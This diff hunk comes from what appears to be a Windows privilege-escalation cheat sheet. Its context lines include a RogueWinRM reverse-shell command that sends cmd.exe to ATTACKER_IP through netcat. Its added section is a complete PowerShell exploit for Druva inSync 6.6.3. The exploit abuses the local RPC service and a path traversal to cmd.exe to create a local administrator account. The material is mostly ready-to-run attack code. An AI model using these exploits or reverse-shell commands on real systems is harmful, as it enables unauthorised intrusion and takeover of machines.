@@ -89,4 +89,29 @@ via SeImpersonate / SeAssignPrimaryToken
 2. (Attacker Machine) nc -nlvp 4446
 3. c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4446"
 
+via Unpatched Software (Druva inSync 6.6.3)
+
+1. The following is an exploit that will create user pwnd and assign it to the administrators group.
+
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd examplePassword /add & net localgroup administrators pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+
 
